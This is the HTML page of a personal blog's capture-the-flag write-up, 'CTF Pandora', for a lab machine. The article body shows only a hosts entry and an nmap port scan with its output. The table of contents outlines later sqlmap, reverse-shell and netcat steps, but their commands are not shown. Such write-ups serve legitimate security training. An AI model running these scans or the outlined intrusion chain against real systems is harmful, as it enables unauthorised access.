@@ -1,0 +1,1547 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CTF Pandora | Peanutstick</title>
+  <meta name="keywords" content=" Linux ">
+  <meta name="description" content="CTF Pandora | Peanutstick">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="&#x2F;etc&#x2F;hosts10.10.11.124 shibboleth.htb nmapnmap -sV shibboleth.htb  PORT STATE SERVICE VERSION  80&#x2F;tcp open http Apache httpd 2.4.41 We only have an apache server. gobustergobuster dir -t 100 -u h">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF Shibboleth">
+<meta property="og:url" content="http://peanutstick.duckdns.org/post/CTF_Shibboleth.html">
+<meta property="og:site_name" content="Peanutstick">
+<meta property="og:description" content="&#x2F;etc&#x2F;hosts10.10.11.124 shibboleth.htb nmapnmap -sV shibboleth.htb  PORT STATE SERVICE VERSION  80&#x2F;tcp open http Apache httpd 2.4.41 We only have an apache server. gobustergobuster dir -t 100 -u h">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.imgur.com/hwLrBG4.png">
+<meta property="og:image" content="https://i.imgur.com/JjPUFhl.png">
+<meta property="og:image" content="https://i.imgur.com/wwNadhq.png">
+<meta property="og:image" content="https://i.imgur.com/tvZYZ5i.png">
+<meta property="og:image" content="https://i.imgur.com/T4SLwub.png">
+<meta property="og:image" content="https://i.imgur.com/NjeFyWU.png">
+<meta property="og:image" content="https://i.imgur.com/KsbCPG0.png">
+<meta property="og:image" content="https://i.imgur.com/yDEBpLw.png">
+<meta property="og:image" content="https://i.imgur.com/RsOO332.png">
+<meta property="article:published_time" content="2022-03-12T23:29:02.000Z">
+<meta property="article:modified_time" content="2022-03-16T18:07:17.510Z">
+<meta property="article:author" content="Peanutstick">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/hwLrBG4.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+<script id="dsq-count-scr" src="//peanutstick.disqus.com/count.js" async></script>
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="true">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>Peanutstick</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+            <a title="github"
+               href="https://github.com/Peanutstick"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            <a title="reddit"
+               href="https://www.reddit.com/user/benjy500c/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-reddit"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(61)</small>
+            
+        </div>
+    </li>
+    
+        
+            
+                <li>
+                    <div data-rel="CTF">
+                        
+                        CTF
+                        <small>(23)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Fix">
+                        
+                        Fix
+                        <small>(5)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Os">
+                        
+                        Os
+                        <small>(17)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Other">
+                        
+                        Other
+                        <small>(1)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Programing">
+                        
+                        Programing
+                        <small>(3)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Security">
+                        
+                        Security
+                        <small>(3)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Service">
+                        
+                        Service
+                        <small>(5)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+        
+            
+                <li>
+                    <div data-rel="Tips">
+                        
+                        Tips
+                        <small>(4)</small>
+                        
+                    </div>
+                    
+                </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+            
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">About</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="61">
+<input type="hidden" id="yelog_site_word_count" value="28.3k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://irc.evilcorp.ga/">Evilcorp</a></li>
+            
+            <li><a target="_blank" href="https://github.com/TripleZer000">TripleZer0</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="返回"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
+            <i class="iconfont icon-tag" data-title="标签"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">Contents</div>
+            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>IRC Python</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Linux, Gaming</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Pentest</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Security</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>Tor</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>VPN</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="All CTF "
+           href="/post/CTF_Shibboleth.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Shibboleth">CTF Shibboleth</span>
+            <span class="post-date" title="2022-03-13 00:29:02">2022/03/13</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_PwnLab.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF PwnLab">CTF PwnLab</span>
+            <span class="post-date" title="2022-03-06 04:07:56">2022/03/06</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Simple_CTF.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF simple CTF">CTF simple CTF</span>
+            <span class="post-date" title="2022-03-03 01:20:52">2022/03/03</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_hacker_kid.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF hacker kid">CTF hacker kid</span>
+            <span class="post-date" title="2022-02-28 03:19:25">2022/02/28</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/How_to_gain_some_GiB_on_Arch_Linux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="How to gain some GiB on Arch Linux">How to gain some GiB on Arch Linux</span>
+            <span class="post-date" title="2022-02-21 03:15:52">2022/02/21</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_jordaninfosec.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Jordaninfosec">CTF Jordaninfosec</span>
+            <span class="post-date" title="2022-02-17 22:11:00">2022/02/17</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Deathnote.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Deathnote">CTF Deathnote</span>
+            <span class="post-date" title="2022-02-08 02:20:57">2022/02/08</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Paper.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Paper">CTF Paper</span>
+            <span class="post-date" title="2022-02-06 04:07:56">2022/02/06</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Pandora.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Pandora">CTF Pandora</span>
+            <span class="post-date" title="2022-02-05 01:30:52">2022/02/05</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Meta.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Meta">CTF Meta</span>
+            <span class="post-date" title="2022-02-02 03:15:02">2022/02/02</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Secret.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Secret">CTF Secret</span>
+            <span class="post-date" title="2022-01-31 00:29:02">2022/01/31</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Backdoor.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Backdoor">CTF Backdoor</span>
+            <span class="post-date" title="2022-01-29 22:19:25">2022/01/29</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Horizontall.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Horizontall">CTF Horizontall</span>
+            <span class="post-date" title="2022-01-23 20:42:51">2022/01/23</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Toppo.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Toppo">CTF Toppo</span>
+            <span class="post-date" title="2022-01-22 17:54:42">2022/01/22</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/Walpaper_selector_with_sxiv.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Wallpaper selector with sxiv">Wallpaper selector with sxiv</span>
+            <span class="post-date" title="2022-01-22 02:35:56">2022/01/22</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_cybersploit.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF cybersploit">CTF cybersploit</span>
+            <span class="post-date" title="2022-01-21 20:19:23">2022/01/21</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_unknowndevice64-1.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF unknowndevice64-1">CTF unknowndevice64-1</span>
+            <span class="post-date" title="2022-01-19 20:51:42">2022/01/19</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/Record_screen_with_ffmpeg.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Record screen with ffmpeg">Record screen with ffmpeg</span>
+            <span class="post-date" title="2022-01-19 01:56:09">2022/01/19</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_commands_and_files.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF commands and files">CTF commands and files</span>
+            <span class="post-date" title="2022-01-17 22:55:38">2022/01/17</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/set_up_smb.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="set up smb">set up smb</span>
+            <span class="post-date" title="2022-01-16 05:01:27">2022/01/16</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Stapler.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Stapler">CTF Stapler</span>
+            <span class="post-date" title="2022-01-15 01:07:29">2022/01/15</span>
+        </a>
+        
+        <a  class="All Programing "
+           href="/post/Create_a_polybar_module.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Create a polybar module">Create a polybar module</span>
+            <span class="post-date" title="2022-01-12 23:09:01">2022/01/12</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Replacing_xfce4_bar_by_Polybar.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Replacing xfce4 bar by Polybar">Replacing xfce4 bar by Polybar</span>
+            <span class="post-date" title="2022-01-12 00:57:59">2022/01/12</span>
+        </a>
+        
+        <a  class="All Programing "
+           href="/post/Script_to_create_my_article_page.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Script to create my article page.">Script to create my article page.</span>
+            <span class="post-date" title="2022-01-11 22:30:34">2022/01/11</span>
+        </a>
+        
+        <a  class="All Other "
+           href="/post/Cut_an_online_video_with_ffmpeg.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Cut an online video with ffmpeg">Cut an online video with ffmpeg</span>
+            <span class="post-date" title="2022-01-11 03:15:52">2022/01/11</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/Stream_audio_video_at_home.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Create a locale stream">Create a locale stream</span>
+            <span class="post-date" title="2022-01-09 19:18:22">2022/01/09</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_SickOs.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF_SickOs">CTF_SickOs</span>
+            <span class="post-date" title="2022-01-09 01:15:52">2022/01/09</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Dina.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Dinae">CTF Dinae</span>
+            <span class="post-date" title="2022-01-08 22:16:52">2022/01/08</span>
+        </a>
+        
+        <a  class="All Tips "
+           href="/post/weather.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Weather in CLI">Weather in CLI</span>
+            <span class="post-date" title="2022-01-06 18:15:52">2022/01/06</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/switch_from_i3_to_bspwm.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Switch from i3 to bspwm">Switch from i3 to bspwm</span>
+            <span class="post-date" title="2022-01-01 01:37:52">2022/01/01</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Fix_teams.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Fix my spyware is stuck in the login loop (Microsoft teams)">Fix my spyware is stuck in the login loop (Microsoft teams)</span>
+            <span class="post-date" title="2021-12-27 21:15:52">2021/12/27</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/nitrogen_with_wal.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="How do I setup nitrogen &amp; pywal">How do I setup nitrogen &amp; pywal</span>
+            <span class="post-date" title="2021-12-25 03:15:52">2021/12/25</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Setup_Xfce_with_i3.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Setup_Xfce_with_i3">Setup_Xfce_with_i3</span>
+            <span class="post-date" title="2021-12-24 05:17:00">2021/12/24</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/Set_firewall_ufw.html"
+           data-tag="Security"
+           data-author="" >
+            <span class="post-title" title="Set up a firewall with ufw">Set up a firewall with ufw</span>
+            <span class="post-date" title="2021-11-01 20:05:52">2021/11/01</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/Port_knocking.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Set up port knocking server to hide an open port">Set up port knocking server to hide an open port</span>
+            <span class="post-date" title="2021-10-31 01:15:52">2021/10/31</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Tr0ll.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Tr0ll">CTF Tr0ll</span>
+            <span class="post-date" title="2021-10-02 01:15:52">2021/10/02</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Run_games_on_lutris_with_proton.html"
+           data-tag="Linux, Gaming"
+           data-author="" >
+            <span class="post-title" title="Run non steam game with proton on lutris">Run non steam game with proton on lutris</span>
+            <span class="post-date" title="2021-09-15 04:40:52">2021/09/15</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Add-windows-to-grub.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Add windows to grub">Add windows to grub</span>
+            <span class="post-date" title="2021-08-28 07:54:52">2021/08/28</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/gparted.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Resize the main partion with gparted">Resize the main partion with gparted</span>
+            <span class="post-date" title="2021-08-27 17:08:52">2021/08/27</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/cheat-sheet.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Cheat Sheet of the commands I use">Cheat Sheet of the commands I use</span>
+            <span class="post-date" title="2021-08-08 17:15:52">2021/08/08</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Set_polybar_on_2_screen.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Set Polybar on 2 screens">Set Polybar on 2 screens</span>
+            <span class="post-date" title="2021-08-08 04:15:52">2021/08/08</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Ted.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="CTF Ted">CTF Ted</span>
+            <span class="post-date" title="2021-08-08 04:15:52">2021/08/08</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Change_screen_resolution.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Change screen resolution with xandr">Change screen resolution with xandr</span>
+            <span class="post-date" title="2021-08-02 04:15:52">2021/08/02</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Low_fps_in_games.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="My games are unplayable">My games are unplayable</span>
+            <span class="post-date" title="2021-08-01 19:15:52">2021/08/01</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Set_shortcut_for_brightness.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Set shortcut with i3 for brightness.">Set shortcut with i3 for brightness.</span>
+            <span class="post-date" title="2021-07-31 20:23:52">2021/07/31</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_Inferno.html"
+           data-tag="Pentest"
+           data-author="" >
+            <span class="post-title" title="CTF Inferno">CTF Inferno</span>
+            <span class="post-date" title="2021-07-19 18:59:52">2021/07/19</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Fix_picom_blur_not_working.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Fix the blur with picom">Fix the blur with picom</span>
+            <span class="post-date" title="2021-07-18 22:40:52">2021/07/18</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Configure_touchpad_on_i3.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Configure the touchpad [I3]">Configure the touchpad [I3]</span>
+            <span class="post-date" title="2021-07-16 02:16:52">2021/07/16</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/Send_file_via_ssh.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Send a file via ssh">Send a file via ssh</span>
+            <span class="post-date" title="2021-07-14 04:15:52">2021/07/14</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Install-nvidia-driver.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Install nvidia driver on Arch Linux">Install nvidia driver on Arch Linux</span>
+            <span class="post-date" title="2021-07-13 17:48:52">2021/07/13</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Restore-backup.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Restore a backup with timeshift">Restore a backup with timeshift</span>
+            <span class="post-date" title="2021-07-12 01:59:52">2021/07/12</span>
+        </a>
+        
+        <a  class="All Fix "
+           href="/post/Repare-wine.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="wine: could not load kernel32.dll, status c0000135">wine: could not load kernel32.dll, status c0000135</span>
+            <span class="post-date" title="2021-07-11 18:50:52">2021/07/11</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Create_new_partition_linux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Add a partition in linux">Add a partition in linux</span>
+            <span class="post-date" title="2021-07-11 03:06:52">2021/07/11</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Save-Arch-linux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Get a shell when Arch Linux is broken">Get a shell when Arch Linux is broken</span>
+            <span class="post-date" title="2021-07-07 06:55:56">2021/07/07</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Install-AUR-packages.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Installing AUR packages">Installing AUR packages</span>
+            <span class="post-date" title="2021-07-04 13:45:52">2021/07/04</span>
+        </a>
+        
+        <a  class="All Os "
+           href="/post/Install-ArchLinux.html"
+           data-tag="Linux"
+           data-author="" >
+            <span class="post-title" title="Arch Linux installation guide">Arch Linux installation guide</span>
+            <span class="post-date" title="2021-07-01 04:15:52">2021/07/01</span>
+        </a>
+        
+        <a  class="All CTF "
+           href="/post/CTF_gigachad.html"
+           data-tag="Pentest"
+           data-author="" >
+            <span class="post-title" title="CTF-gigachad">CTF-gigachad</span>
+            <span class="post-date" title="2021-07-01 04:15:52">2021/07/01</span>
+        </a>
+        
+        <a  class="All Programing "
+           href="/post/Create-an-IRC-bot-with-python.html"
+           data-tag="IRC Python"
+           data-author="" >
+            <span class="post-title" title="Create an IRC bot with python">Create an IRC bot with python</span>
+            <span class="post-date" title="2021-06-21 21:25:10">2021/06/21</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/openVPN.html"
+           data-tag="VPN"
+           data-author="" >
+            <span class="post-title" title="OpenVPN">OpenVPN</span>
+            <span class="post-date" title="2021-06-20 17:53:11">2021/06/20</span>
+        </a>
+        
+        <a  class="All Service "
+           href="/post/Relais-tor.html"
+           data-tag="Tor"
+           data-author="" >
+            <span class="post-title" title="Création d&#39;un relais tor avec debian 10">Création d&#39;un relais tor avec debian 10</span>
+            <span class="post-date" title="2021-04-09 13:45:52">2021/04/09</span>
+        </a>
+        
+        <a  class="All Security "
+           href="/post/Secu-apache.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Securing an apache server">Securing an apache server</span>
+            <span class="post-date" title="2021-03-09 12:45:52">2021/03/09</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="切换全屏 快捷键 s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-CTF_Pandora" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">CTF Pandora</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            <i class="iconfont icon-category"></i>
+            
+            
+            <a  data-rel="CTF">CTF</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color1">Linux</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2022-02-11 18:30:04'>2022-02-05 01:30</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:1.8k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="跳转至评论区">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#etc-hosts"><span class="toc-text">&#x2F;etc&#x2F;hosts</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#wfuzz"><span class="toc-text">wfuzz</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#nmap-n%C2%B02"><span class="toc-text">nmap n°2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Matasploit"><span class="toc-text">Matasploit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ssh"><span class="toc-text">ssh</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#lse"><span class="toc-text">lse</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pownkit"><span class="toc-text">pownkit</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pandora-backup"><span class="toc-text">pandora_backup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#linPEAS"><span class="toc-text">linPEAS</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql"><span class="toc-text">mysql</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-tunneling"><span class="toc-text">Web tunneling</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Connnect-with-daniel"><span class="toc-text">Connnect with daniel</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Browsing-the-files"><span class="toc-text">Browsing the files</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap"><span class="toc-text">sqlmap</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#list-of-tables"><span class="toc-text">list of tables</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#As-admin"><span class="toc-text">As admin.</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Download-the-revershell"><span class="toc-text">Download the revershell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Zip-it"><span class="toc-text">Zip it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#netcat"><span class="toc-text">netcat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Upload-it"><span class="toc-text">Upload it</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#I%E2%80%99m-matt"><span class="toc-text">I’m matt</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pandora-backup-1"><span class="toc-text">pandora_backup</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="etc-hosts"><a href="#etc-hosts" class="headerlink" title="/etc/hosts"></a>/etc/hosts</h1><pre class="line-numbers language-none"><code class="language-none">10.10.11.136 pandora.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h1><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">nmap -sV -p- 10.10.11.136
+
+PORT   STATE SERVICE VERSION
+22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
